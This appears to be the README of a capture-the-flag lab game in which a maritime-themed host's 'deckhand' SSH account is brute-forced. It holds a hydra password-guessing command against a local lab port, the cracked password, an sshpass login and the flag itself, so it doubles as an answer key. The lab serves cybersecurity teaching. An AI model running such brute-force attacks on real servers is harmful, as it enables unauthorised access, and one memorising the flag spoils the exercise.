# ssh-weak-v2 — SSH Brute-Force (Maritime Scenario)

**Vulnerability:** Weak SSH credentials guessable by dictionary attack — maritime sector scenario  
**Tool:** `hydra`  
**Flag:** `WMG{w3ak_ssh_cr3ds_s1nk_sh1ps}`

## Scenario

Halcyon Marine provisioned a `deckhand` account with a predictable maritime
password. SSH is exposed on port 22. A sector-specific wordlist (`crew-passwords.txt`)
reflects the kinds of passwords maritime workers choose. Students use hydra to
brute-force the password, then SSH in to retrieve the cargo manifest (flag).

This game is a fresh variant of `ssh-weak-password`: different organisation,
different username (`deckhand` vs `student`), different lore, and a maritime-
themed wordlist — teaching the same technique in a new context.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/ssh-weak-v2/setup.yml
```

First run: `ok=7 changed=4`  
Second run: `ok=7 changed=0` (idempotent)

## Verify

```bash
./agent-harness/verify.sh ssh-weak-v2
```

## Expected exploit

```bash
hydra -l deckhand -P games/ssh-weak-v2/files/crew-passwords.txt \
  ssh://127.0.0.1 -s 2222
# → [22][ssh] login: deckhand   password: Sailor2024

sshpass -p Sailor2024 ssh -p 2222 deckhand@127.0.0.1 'cat ~/manifest.txt'
# → WMG{w3ak_ssh_cr3ds_s1nk_sh1ps}
```

## Training

`training.json` — 9 levels: OSINT → port scan → hydra brute-force → SSH access → flag retrieval → ASSESSMENT.  
MITRE ATT&CK: T1110.001 (Brute Force: Password Guessing), T1078 (Valid Accounts).  
CyberRangeCZ subnet: 10.1.32.0/24
